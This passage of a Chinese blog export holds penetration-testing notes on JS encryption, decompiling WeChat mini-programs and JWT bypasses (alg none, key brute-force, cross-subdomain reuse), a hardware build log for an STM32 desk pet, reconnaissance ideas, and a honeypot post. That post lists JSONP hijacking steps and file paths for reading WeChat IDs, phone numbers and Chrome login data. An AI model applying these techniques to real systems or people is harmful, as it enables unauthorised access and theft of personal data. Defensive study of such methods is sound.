<h6 id="1、在js中找加密和解密算法"><a href="#1、在js中找加密和解密算法" class="headerlink" title="1、在js中找加密和解密算法"></a>1、在js中找加密和解密算法</h6><p>​		—如果是自定义算法你可中大奖了，你得解算法</p>
<p>​		—&gt;适用于简单的、有框架可套的算法，例如：AES、DES、RSA-酌情考虑</p>
<p>​		1&gt;主要是排查js代码中的加密函数和解密函数，小程序的话需要用工具调出控制台进行调试</p>
<p>​		2&gt;排查的函数通常为encrypt、decrypt函数，简单的直接在源代码处ctrl+f找这两单词就行，复杂的需要交数据前暂停执行进行调试，可能有点抽象，给个图就好了</p>
<p><img src="/../image/note_24_12/1_1-2.jpg" alt="1_1-2"></p>
<p>​		3&gt;复杂的需要一步步找，一般是小程序需要调试，步骤如下：</p>
<p>​			（1）、暂停执行</p>
<p>​			（2）、输入框中输入数据</p>
<p>​			（3）、点下一步，或者下一个函数</p>
<p>​			（4）、等监视的数据突然加密了，就记下那个函数分析</p>
<p>​			（5）、主要找加密算法是什么、iv和key，自定义算法和国密那些就用第二个方法吧</p>
<p>​	小程序需要用工具调出，工具推荐如下：</p>
<p>​			①、<a href="https://github.com/eeeeeeeeee-code/e0e1-wx">windows_自动化反编译</a> </p>
<p>​			②、<a href="https://github.com/JaveleyQAQ/WeChatOpenDevTools-Python/releases/">WeChatOpenDevTools-Python</a> </p>
<h6 id="2、在控制台中定义函数直接输入数据"><a href="#2、在控制台中定义函数直接输入数据" class="headerlink" title="2、在控制台中定义函数直接输入数据"></a>2、在控制台中定义函数直接输入数据</h6><p>​		1&gt;这个如果处理的好，在web端基本可以直接无需理会加密</p>
<p>​			—&gt;需要比较熟练的使用python或者其他的代码，但是，熟练使用ai也行</p>
<p>​		2&gt;有篇文章讲的很细，如下：</p>
<p>​			—&gt;<a href="https://xz.aliyun.com/t/14629?time__1311=GqAhYK0KBKAIP05DKBOxmEr8RpQcC1aoD">保姆级教程—前端加密的对抗（附带靶场） - 先知社区</a> </p>
<h6 id="3、other"><a href="#3、other" class="headerlink" title="3、other"></a>3、other</h6><p>​	—&gt;在应用软件中去壳逆向分析伪代码</p>
<h3 id="jwt-api问题"><a href="#jwt-api问题" class="headerlink" title="jwt_api问题"></a>jwt_api问题</h3><p>​	我见识现在不多，有错误的地方，想起来了就回来改一下，没有想起来就错下去喽。</p>
<p>​	jwt身份验证，一般情况不会给人伪造为空或者爆破出来密钥的机会，对我们有利的地方是通过正规途径获得一个合法的jwt后他们的接口通常不会有过多的权限管理，人话就是越权，逻辑洞可能比较多</p>
<h6 id="1、尝试jwt绕过"><a href="#1、尝试jwt绕过" class="headerlink" title="1、尝试jwt绕过"></a>1、尝试jwt绕过</h6><h6 id="—-生产环境没成功过"><a href="#—-生产环境没成功过" class="headerlink" title="—&gt;生产环境没成功过"></a>—&gt;生产环境没成功过</h6><p>在渗透测试中，可以尝试以下几种JWT绕过方法—没有也要试试，成功就爽了</p>
<p>​	1&gt;<strong>修改JWT令牌</strong>：通过修改JWT的Payload部分，可以尝试提升权限。例如，将用户角色从普通用户修改为管理员<a href="https://xz.aliyun.com/t/12906">1</a>。</p>
<p>​	2&gt;<strong>利用过期令牌</strong>：有时即使JWT令牌已过期，服务器端可能仍然接受该令牌。通过修改令牌中的<em>exp</em>（过期时间）字段，可以尝试让过期令牌重新生效<a href="https://blog.csdn.net/yang1234567898/article/details/122226635">2</a>。</p>
<p>​	3&gt;<strong>历史令牌伪造</strong>：如果能够获取到历史JWT令牌，可以尝试修改其中的<em>iat</em>（签发时间）和<em>exp</em>字段，使其看起来像是新签发的令牌<a href="https://blog.csdn.net/weixin_51559599/article/details/134860478">3</a>。</p>
<p>​	4&gt;<strong>算法混淆</strong>：JWT头部中的<em>alg</em>字段指定了签名算法。如果服务器端没有正确验证该字段，可以尝试将其修改为<em>none</em>，绕过签名验证<a href="https://xz.aliyun.com/t/12906">1</a>。</p>
<p>​	5&gt;<strong>密钥爆破</strong>：如果服务器使用了弱密钥，可以尝试使用密钥字典进行爆破，获取用于签名的密钥<a href="https://blog.csdn.net/yang1234567898/article/details/122226635">2</a>。</p>
<p>​	6&gt;<strong>SQL注入绕过key</strong>：在某些情况下，如果JWT令牌中包含SQL注入漏洞，可以通过注入攻击绕过密钥验证<a href="https://blog.csdn.net/yang1234567898/article/details/122226635">2</a>。</p>
<h6 id="2、利用jwt"><a href="#2、利用jwt" class="headerlink" title="2、利用jwt"></a>2、利用jwt</h6><h6 id="—-找api看越权"><a href="#—-找api看越权" class="headerlink" title="—&gt;找api看越权"></a>—&gt;找api看越权</h6><p>​	拿小程序来说，一般会直接给你一个jwt，这个jwt在服务器里面没有绑定任何用户，里面一般会有一个类似于openid的存在，当然有些要你注册或者登录才会响应一个jwt或者token</p>
<p>​	1&gt;将小程序反编译出来的代码进行分析整理，可以用我上面给的自动化反编译的那个软件，主要整理出接口和网址</p>
<p>​	2&gt;有接口就直接爆GET、POST、PUT、HEAD、TRACE等（生产环境没事别爆delete，爆成功等死）分析响应包，很明显的，一般就几种响应，要么200，要么权限不足，要么返回数据，要么说你类型错误，当然还有给你拉小黑屋的</p>
<p>​	3&gt;有响应就分析操作；该方法主要是找api，不一定只有反编译的js里有，其本身小程序也是前端，可以尝试更改响应包跑前端的接口</p>
<h6 id="—-同一域名使用"><a href="#—-同一域名使用" class="headerlink" title="—&gt;同一域名使用"></a>—&gt;同一域名使用</h6><p>​	拿网址举例，123.123.com的合法jwt，或许是可以到111.123.com的网址使用的，也就是说，如果你一个网址没有权限，可以先尝试去找一样域名的其他网址去注册一个合法用户，获得jwt后尝试直接使用该网址的功能</p>
]]></content>
      <categories>
        <category>Cybersecurity</category>
      </categories>
      <tags>
        <tag>api</tag>
        <tag>js</tag>
        <tag>Cybersecurity</tag>
        <tag>jwt</tag>
        <tag>keys</tag>
      </tags>
  </entry>
  <entry>
    <title>智能桌宠</title>
    <url>/2024/12/18/%E6%99%BA%E8%83%BD%E6%A1%8C%E9%9D%A2%E5%AE%A0%E7%89%A9/</url>
    <content><![CDATA[<p>该文章为尝试进行智能桌宠的搭建前记录的相关流程和笔记，以免自己行动时步骤不对直接爆炸；</p>
<h2 id="教程视频"><a href="#教程视频" class="headerlink" title="教程视频"></a>教程视频</h2><p>​	<a href="https://www.bilibili.com/video/BV1xD6MYGEzD/?spm_id_from=333.999.0.0&vd_source=62ec56a0e96ac07702343ec20500f1cc">STM32智能桌面宠物总教程_哔哩哔哩_bilibili</a>	该视频为搭建桌宠的教程</p>
<p>​	总计花费3.6元购买了总材料</p>
<h3 id="视频步骤"><a href="#视频步骤" class="headerlink" title="视频步骤"></a>视频步骤</h3><span id="more"></span>

<h5 id="嘉立创下单PCB和3D打印"><a href="#嘉立创下单PCB和3D打印" class="headerlink" title="嘉立创下单PCB和3D打印"></a>嘉立创下单PCB和3D打印</h5><p>​		—&gt;用他的模板，导出文件后去领卷买东西</p>
<p>​		（1）、<a href="https://pro.lceda.cn/">构建单片机的软件</a>	可有可无</p>
<p>​		（2）、<a href="https://www.jlc.com/portal/appDownloadsWithConfig.html">嘉立创PCB下单</a></p>
<p><img src="/../image/Smart_table_pets/buy_pcb.png"></p>
<p>​			后面下单参数太多懒得截图：</p>
<p>​			<a href="https://www.bilibili.com/video/BV1xD6MYGEzD/?spm_id_from=333.999.0.0&vd_source=62ec56a0e96ac07702343ec20500f1cc&t=390">STM32智能桌面-跳转到第390秒</a></p>
<p>​			哔哩哔哩把跳转参数关了的话就是该教程的6:30分处</p>
<p>​			（3）、嘉立创3D打印下单</p>
<p>​			<a href="https://www.bilibili.com/video/BV1xD6MYGEzD/?spm_id_from=333.999.0.0&vd_source=62ec56a0e96ac07702343ec20500f1cc&t=461">STM32智能桌面-跳转到第7:41</a></p>
<h5 id="焊接"><a href="#焊接" class="headerlink" title="焊接"></a>焊接</h5><h6 id="1-焊接视频"><a href="#1-焊接视频" class="headerlink" title="1&gt;焊接视频"></a>1&gt;焊接视频</h6><p>​			<a href="https://www.bilibili.com/video/BV1xD6MYGEzD/?spm_id_from=333.999.0.0&vd_source=62ec56a0e96ac07702343ec20500f1cc&t=481">STM32智能桌面-跳转到第8:01</a></p>
<p>​		（1）、焊接开关</p>
<p>​			—&gt;焊接开关时，一定要先焊接开关左侧的</p>
<p>​			—&gt;先上锡固定开关左侧一角，然后直接焊其他角</p>
<p><img src="/../image/Smart_table_pets/Welding_switches.jpg" alt="焊接开关后成品"></p>
<p>​		（2）、焊接电阻、LED灯</p>
<p>​			—&gt;LED反面有箭头，必须保证箭头朝上</p>
<p>​			然后在电阻的右侧焊接AMS芯片</p>
<p>​					(c1、c2全是电容)</p>
<p>​			可以用锂电池进行测试—确保开关已拨通</p>
<p><img src="/../image/Smart_table_pets/hj_1-2.jpg"></p>
<p>​		（3）、焊接电容</p>
<p>​			—&gt;C1为10UF、C2为100NF</p>
<p>​			<img src="/../image/Smart_table_pets/Soldering_capacitors.jpg"></p>
<p><img src="/../image/Smart_table_pets/Soldering_capacitors2.jpg"></p>
<p>​			—&gt;当然右侧开关那还有一堆电容</p>
<p>​		（4）、焊接电源排针</p>
<p><img src="/../image/Smart_table_pets/hj_1-4.jpg"></p>
<p>​		（5）、焊接1X20P的排母</p>
<p>​			—&gt;只需要焊接两部分，即开头、结尾两行：</p>
<p><img src="/../image/Smart_table_pets/hj_1-5.jpg"></p>
<p>​			<img src="/../image/Smart_table_pets/hj_1-5_2.jpg"></p>
<p>​			—&gt;单片机的两种选择{<a href="%E6%8E%92%E9%92%88%E8%BF%87%E9%95%BF%E4%BC%9A%E5%8E%8B%E5%88%B0%E4%B8%8B%E9%9D%A2%E7%9A%84%E7%94%B5%E6%B1%A0">焊接好排针的</a>、[直接带排针的]、<a href="%E8%80%83%E9%AA%8C%E7%84%8A%E6%8E%A5%E8%83%BD%E5%8A%9B%EF%BC%8C%E5%BB%BA%E8%AE%AE%E9%80%890%EF%BC%8C%E7%84%B6%E5%90%8E%E5%89%AA%E6%8E%89%E9%95%BF%E7%9A%84">不焊接排针的</a>}</p>
<p>​	<a href="https://www.bilibili.com/video/BV1xD6MYGEzD/?spm_id_from=333.999.0.0&vd_source=62ec56a0e96ac07702343ec20500f1cc&t=815">STM32智能桌面-跳转到第13:35</a>  —不焊接排查麻烦但可以避免压到电池和语音模块不好插上</p>
<p>​		（6）、焊接XH直针</p>
<p>​		—&gt;右上角焊接XH直针     &#x2F;&#x2F;语音模块的咪头和喇叭处也是</p>
<p>​		—&gt;语音模块焊接排针</p>
<h6 id="2-其余相关注意事项"><a href="#2-其余相关注意事项" class="headerlink" title="2&gt;其余相关注意事项"></a>2&gt;其余相关注意事项</h6><p>​		（1）、锂电池的正负极分别充放电模块的B+和B</p>
<p>​		（2）、输出电源线要接好—是焊接到模块中央位置两侧：</p>
<p><img src="/../image/Smart_table_pets/zy_2-2.jpg"></p>
<p>​		（3）、喇叭没有正负，味头上有三条线的是负极</p>
<h6 id="3-程序"><a href="#3-程序" class="headerlink" title="3&gt;程序"></a>3&gt;程序</h6><p>​		（1）、串口下载单片机程序</p>
<p>​			—&gt;使用前需要安装CH340的环境驱动</p>
<p>​			<a href="https://www.bilibili.com/video/BV1xD6MYGEzD/?spm_id_from=333.999.0.0&vd_source=62ec56a0e96ac07702343ec20500f1cc&t=900">STM32智能桌面-跳转到第15:00</a> </p>
<p>​		（2）、接线部分</p>
<p>​			接线—接线烧录 &#x2F; CH340</p>
<p>​			—&gt;使用前拔跳线帽</p>
<p>​			<a href="https://www.bilibili.com/video/BV1xD6MYGEzD/?spm_id_from=333.999.0.0&vd_source=62ec56a0e96ac07702343ec20500f1cc&t=941">STM32智能桌面-跳转到第15:41</a> </p>
<p>​		（3）、烧录语音部分</p>
<p>​			—&gt;点击烧录后，需要拔5V线等两秒再接上去</p>
<p>​			</p>
<h6 id="4-组装"><a href="#4-组装" class="headerlink" title="4&gt;组装"></a>4&gt;组装</h6><p>​		（1）、模型组装</p>
<p>​			—&gt;考验手工了，前面都完成了，这里应该没什么问题了</p>
<p>​			<a href="https://www.bilibili.com/video/BV1xD6MYGEzD/?spm_id_from=333.999.0.0&vd_source=62ec56a0e96ac07702343ec20500f1cc&t=1114">STM32智能桌面-跳转到第18:34</a></p>
<p>​			—&gt;用面包板线将OLED的排母与做成的排母相连时，要看好你OLED屏幕左侧是GND还是VCC</p>
<p>​		（2）、排线</p>
<p>​			—&gt;太长了剪掉重新接应该也可以</p>
<h6 id="5-语音网站配置"><a href="#5-语音网站配置" class="headerlink" title="5&gt;语音网站配置"></a>5&gt;语音网站配置</h6><p>​		（1）、智能公元网址</p>
<p>​			<a href="https://www.bilibili.com/video/BV1xD6MYGEzD/?spm_id_from=333.999.0.0&vd_source=62ec56a0e96ac07702343ec20500f1cc&t=1640">STM32智能桌面-跳转到第27:20</a></p>
<p>​		（2）、代码逻辑</p>
<p>​			<a href="https://www.bilibili.com/video/BV1xD6MYGEzD/?spm_id_from=333.999.0.0&vd_source=62ec56a0e96ac07702343ec20500f1cc&t=1860">STM32智能桌面-跳转到第31:00</a></p>
<p>结束语：此篇文章为制作前的准备，如果爆炸了不想做了与我无关</p>
]]></content>
      <categories>
        <category>microcontroller</category>
      </categories>
      <tags>
        <tag>单片机</tag>
        <tag>狗</tag>
        <tag>三次元</tag>
      </tags>
  </entry>
  <entry>
    <title>信息搜集思路</title>
    <url>/2024/12/20/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E6%80%9D%E8%B7%AF/</url>
    <content><![CDATA[<h1 id="信息搜集思路扩散"><a href="#信息搜集思路扩散" class="headerlink" title="信息搜集思路扩散"></a>信息搜集思路扩散</h1><p>​	1.ico图标搜集</p>
<p>​	2.icp备案号&#x2F;icp.name备案公司搜集</p>
<p>​	3.域名搜集———简写域名搜集&#x2F;子域名搜集</p>
<span id="more"></span>

<p>​	4.关键字搜寻-title&#x2F;body</p>
<p>​	5.中标公司，名下公司查询—涉及就查</p>
<p>​	6.证书查询</p>
<p>​	7.图片搜索—基本没用</p>
<p>​		1&gt;联合&#x2F;递归查询</p>
<p>​		2&gt;爆破域名查询——-针对空间测绘找不到的影子资产</p>
<p>​		3&gt;域名目录更改—–例如，ab.sb.com——&gt;ab.sb.com&#x2F;ab          目录爆破**</p>
<h1 id="找网址漏洞的信息搜集思路"><a href="#找网址漏洞的信息搜集思路" class="headerlink" title="找网址漏洞的信息搜集思路"></a>找网址漏洞的信息搜集思路</h1><p>​	1.要是信息搜集能力强于web渗透思路如下</p>
<p>​		1&gt;与其在网址上找漏洞不如，根据漏洞找对应网址</p>
<p>​	2.web渗透强于其他</p>
<p>​		2&gt;搜集边缘&#x2F;影子资产，从易到难</p>
<h1 id="根据公众号找web的思路"><a href="#根据公众号找web的思路" class="headerlink" title="根据公众号找web的思路"></a>根据公众号找web的思路</h1><p>​	1.找合作公司的公众号，找相关的功能web</p>
<p>​	2.找到公众号所有的web，根据域名找公司，根据公司找公众号，以此往复***</p>
<p>​	3.根据全称公众号，找下面的无关公众号点点，可能存在你要找的内容功能</p>
]]></content>
      <categories>
        <category>Cybersecurity</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>Information</tag>
        <tag>Official account</tag>
      </tags>
  </entry>
  <entry>
    <title>蜜罐怎么获取个人信息</title>
    <url>/2024/12/20/%E8%9C%9C%E7%BD%90%E8%8E%B7%E5%8F%96%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF/</url>
    <content><![CDATA[<h3 id="蜜罐防守"><a href="#蜜罐防守" class="headerlink" title="蜜罐防守"></a>蜜罐防守</h3><p>​	蜜罐主要是通过web蜜罐和mysql蜜罐来获取个人信息</p>
<p>​	蜜罐通过模拟各种服务来获取个人信息，但也跟漏洞JSONP有关</p>
<p>​	蜜罐获取个人信息主要是依赖用户所注册的网址存在JSONP、XSS等信息泄露的漏洞</p>
<span id="more"></span>

<p><strong>JSONP漏洞与CSRF非常相似，但JSONP劫持只能获得js返回的敏感数据</strong></p>
<p><strong>JSONP劫持步骤：</strong></p>
<p>​	1.蜜罐被访问url</p>
<p>​	2.蜜罐返回包含回调函数的JS代码</p>
<p>​	3.访问网址B时-将回调函数作为参数请求</p>
<p>​	4.返回包含用户信息的JSON数据</p>
<p>​	5.上传用户信息数据到蜜罐</p>
<p><strong>读取微信号</strong></p>
<p>win系统下，读取手机号和微信ID的方法（默认常见微信文件路径）</p>
<p>我们可以下面的步骤来获取用户的微信号</p>
<p>1）通过C:&#x2F;Windows&#x2F;PFRO.log获取windows用户名</p>
<p>2）通过C:&#x2F;Users&#x2F;用户名&#x2F;Documents&#x2F;WeChat Files&#x2F;All Users&#x2F;config&#x2F;config.data获取wxid</p>
<p>3）通过C:&#x2F;Users&#x2F;用户名&#x2F;Documents&#x2F;WeChat Files&#x2F;wx_id&#x2F;config&#x2F;AccInfo.dat获取微信号、手机号</p>
<p><strong>读取chrome的登录数据</strong></p>
<p>读取chrome的login data，虽然无法解密出密码，但是还是可以获取到对方的一些账号</p>
<p>C:&#x2F;Users&#x2F;‘ + username + ‘&#x2F;AppData&#x2F;Local&#x2F;Google&#x2F;Chrome&#x2F;User Data&#x2F;Default&#x2F;Login Data</p>
<p><strong>chrome的历史记录</strong></p>
<p>我们还可以读取chrome的历史记录</p>
<p>C:&#x2F;Users&#x2F;‘ + username + ‘&#x2F;AppData&#x2F;Local&#x2F;Google&#x2F;Chrome&#x2F;User Data&#x2F;Default&#x2F;History</p>
<p>开源蜜罐系统hfish中的mysql蜜罐就利用了这种方式来获取攻击者的文件，如下首先在蜜罐中设置要读取的文件。</p>
<p><img src="/../image/Honeypot/%E8%9C%9C%E7%BD%90.png" alt="蜜罐"></p>
]]></content>
      <categories>
        <category>Cybersecurity</category>
      </categories>
      <tags>
        <tag>Cybersecurity</tag>
        <tag>Honeypot</tag>
        <tag>Information Gathering</tag>
        <tag>Intrusion Detection</tag>
        <tag>Attack Analysis</tag>
      </tags>
  </entry>
</search>
